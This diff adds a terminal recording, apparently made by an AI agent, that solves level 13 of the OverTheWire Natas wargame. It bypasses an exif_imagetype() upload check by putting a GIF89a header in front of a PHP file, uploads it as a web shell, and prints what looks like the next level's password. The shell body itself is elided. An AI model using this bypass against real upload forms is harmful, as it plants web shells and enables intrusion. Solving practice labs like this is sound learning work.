@@ -1,0 +1,10 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469460,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L13.sh","title":"Natas L13 solve","env":{"SHELL":"/bin/bash"}}
+[0.009, "o", "$ curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/index-source.html    # exif_imagetype() gate\r\r\n"]
+[0.926, "o", "exif_imagetype($_FILES['uploadedfile']['tmp_name'])\r\r\n"]
+[0.000, "o", "$ printf \"GIF89a\" > /tmp/shell13.php; printf \"<?php ... ?>\" >> /tmp/shell13.php   # GIF magic header passes exif_imagetype\r\r\n"]
+[0.001, "o", "/tmp/shell13.php: GIF image data, version 89a, 16188 x 26736\r\r\n"]
+[0.000, "o", "$ curl -s -u natas13:<pw> -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/shell13.php;type=image/gif\" http://natas13.natas.labs.overthewire.org/index.php\r\r\n"]
+[1.041, "o", "upload/6vt5rm2a54.php\r\r\n"]
+[0.001, "o", "$ curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/<random>.php\r\r\n"]
+[0.378, "o", "GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8\r\r\n"]
+[0.002, "x", "0"]
